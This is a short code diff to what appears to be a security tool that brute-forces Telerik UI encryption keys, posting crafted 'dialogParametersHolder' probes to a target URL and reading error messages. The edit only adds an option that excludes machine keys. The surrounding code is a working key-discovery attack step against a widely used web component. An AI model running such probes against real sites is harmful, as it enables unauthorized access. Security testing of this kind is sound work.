@@ -171,7 +171,9 @@ def main():
             print("Since we found a valid hash key, we can check for known Telerik Encryption Keys")
 
             #  derivedKey, derivedIV = y.telerik_derivekeys("6YXEG7IH4XYNKdt772p2ni6nbeDT772P2NI6NBE4@")
-            for encryption_key_probe, encryption_key in y.encryptionkey_probe_generator(hash_key):
+            for encryption_key_probe, encryption_key in y.encryptionkey_probe_generator(
+                hash_key, include_machinekeys=False
+            ):
                 data = {"dialogParametersHolder": encryption_key_probe}
                 res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
                 if "Index was outside the bounds of the array" in res.text:
@@ -188,7 +190,9 @@ def main():
     elif key_derive_mode == "PBKDF2":
 
         for hash_key in x.prepare_keylist():
-            for encryption_key_probe, encryption_key in y.encryptionkey_probe_generator(hash_key, key_derive_mode):
+            for encryption_key_probe, encryption_key in y.encryptionkey_probe_generator(
+                hash_key, key_derive_mode, include_machinekeys=False
+            ):
 
                 data = {"dialogParametersHolder": encryption_key_probe}
                 res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
